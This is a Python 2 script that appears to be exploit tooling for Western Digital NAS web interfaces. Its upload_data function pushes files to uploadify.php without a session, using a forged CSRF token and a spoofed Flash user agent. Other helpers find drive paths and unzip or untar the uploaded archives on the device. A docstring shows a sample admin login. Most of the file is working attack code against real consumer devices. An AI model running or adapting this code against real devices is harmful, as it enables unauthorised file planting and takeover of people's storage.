#!/usr/bin/env python

import sys
import requests as R
from binascii import b2a_base64
from urllib import quote_plus
from os import path
import re


DEFAULT_WD_SERVER = 'wd'


class API(object):
    def __init__(self, user='nobody', passwd='', wd_server=DEFAULT_WD_SERVER):
        self.wd_server = wd_server
        self.user = user
        self.passwd = passwd
        self.session = self.login(user, passwd)

    @staticmethod
    def _b64e(inp):
        return b2a_base64(inp).replace('\n', '')

    def _send(self, target, headers=None, cookies=None, data=None, files=None, store_token=True):
        if store_token:
            if not headers:
                headers = {}
            headers['X-CSRF-Token'] = cookies['WD-CSRF-TOKEN']

        return R.post(url='http://{}/{}'.format(self.wd_server, target),
                      headers=headers,
                      cookies=cookies,
                      data=data,
                      files=files)

    def upload_data(self, payload_data, remote_dir, remote_name):
        """
        requires no session
        """

        token = 'tkn'

        headers = {
            'User-Agent': 'Shockwave Flash',
        }

        files = {
            'Filedata': (remote_name, payload_data)
        }

        return self._send('web/jquery/uploader/uploadify.php?WD-CSRF-TOKEN={}'.format(token),
                          headers=headers,
                          data={'X-CSRF-Token': token,
                                'folder': remote_dir
                                },
                          files=files,
                          store_token=False
                          )

    def upload_file(self, file_path, remote_dir, remote_name=None):
        if not remote_name:
            remote_name = path.basename(file_path)

        return self.upload_data(open(file_path, 'rb').read(), remote_dir, remote_name)

    def login(self, uname='nobody', passw=''):
        """
        login('admin','mmmst8j')
        """

        pwd = self._b64e(passw)
        res = self._send('cgi-bin/login_mgr.cgi',
                         data={
                             'cmd': "wd_login",
                             'username': uname,
                             'pwd': pwd,
                             'port': None,
                         },
                         store_token=False)

        d = {}

        for c in res.cookies:
            d[c.name] = c.value

        return d

    def get_available_remote_path(self, session_cookies=None):

        if not session_cookies:
            session_cookies = self.session
            
        res = self._send('cgi-bin/webfile_mgr.cgi',
                         cookies=session_cookies,
                         data={
                             'cmd': 'cgi_folder_content_first',
                             'page': 1,
                             'rp': 10,
                             'query': '',
                             'qtype': '',
                             'f_field': 'false',
                             'used_dir': '',
                         })

        if not res.text:
            print '> ERR: failed getting paths'
            return None

        g = re.findall(r'(?i)\&gt;(/mnt/HD.*?)\&lt;', res.text)
        if len(g) < 1:
            print '> ERR: didnt find any available paths'
            return None

        if len(g) > 1:
            print '> got multiple options, will use the first to get the HD name:'
            print g

        p = g[0]
        hd_path = '/'.join(p.split('/')[:-1])
        return hd_path

    def _un_tar_zip(self, name, remote_dir, session_cookies, cgi_type):
        return self._send('cgi-bin/webfile_mgr.cgi',
                          cookies=session_cookies,
                          data={
                              'cmd': cgi_type,
                              'path': remote_dir,
                              'name': name,
                          }).text

    def unzip(self, name, remote_dir, session_cookies=None):
        if not session_cookies:
            session_cookies = self.session
            
        return self._un_tar_zip(name, remote_dir, session_cookies, 'cgi_unzip')

    def untar(self, name, remote_dir, session_cookies=None):
        if not session_cookies:
            session_cookies = self.session
            
        return '<status>ok</status>' in self._un_tar_zip(name, remote_dir, session_cookies, 'cgi_untar')
